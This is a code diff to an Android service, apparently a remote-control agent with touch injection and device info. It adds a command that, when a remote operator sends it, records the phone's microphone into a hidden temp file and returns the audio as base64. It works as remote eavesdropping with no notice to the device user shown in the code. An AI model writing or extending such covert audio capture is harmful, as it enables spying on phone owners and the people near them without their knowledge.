@@ -297,6 +297,12 @@ class ConnectorService : Service() {
             // get_screen_size → "1080x2340"
             cmd == "get_screen_size" -> Pair(getScreenSize(), "command_result")
 
+            // record_mic:durationSeconds — rekam mikrofon, return base64 3GP audio
+            cmd.startsWith("record_mic:") -> {
+                val sec = cmd.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
+                Pair(recordMic(sec), "command_result")
+            }
+
             // ── Misc ──
             cmd == "device_info"         -> Pair(DeviceInfo.collect(this).toString(), "command_result")
             cmd == "ping"                -> Pair("pong · $deviceName · $deviceId", "command_result")
@@ -755,6 +761,39 @@ class ConnectorService : Service() {
             if (ok) { appendLine("Version: ${Shizuku.getVersion()}"); appendLine("UID: ${Shizuku.getUid()}") }
         }
     } catch (e: Exception) { "ERROR: ${e.message}" }
+
+    // ─────────────────────────────────────────
+    //  MIC RECORDING
+    // ─────────────────────────────────────────
+
+    private fun recordMic(durationSec: Int): String {
+        val tmpPath = "/sdcard/.mic_tmp_${System.currentTimeMillis()}.3gp"
+        var mr: android.media.MediaRecorder? = null
+        return try {
+            mr = android.media.MediaRecorder().apply {
+                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
+                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                setAudioSamplingRate(8000)
+                setAudioEncodingBitRate(12200)
+                setOutputFile(tmpPath)
+                prepare()
+                start()
+            }
+            Thread.sleep(durationSec.toLong() * 1000)
+            mr.stop()
+            mr.release()
+            mr = null
+            val bytes = java.io.File(tmpPath).readBytes()
+            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
+            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+        } catch (e: Exception) {
+            try { mr?.stop() } catch (_: Exception) {}
+            try { mr?.release() } catch (_: Exception) {}
+            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
+            "ERROR: ${e.message} (pastikan RECORD_AUDIO permission diberikan)"
+        }
+    }
 
     // ─────────────────────────────────────────
     //  REMOTE CONTROL — TOUCH INJECT
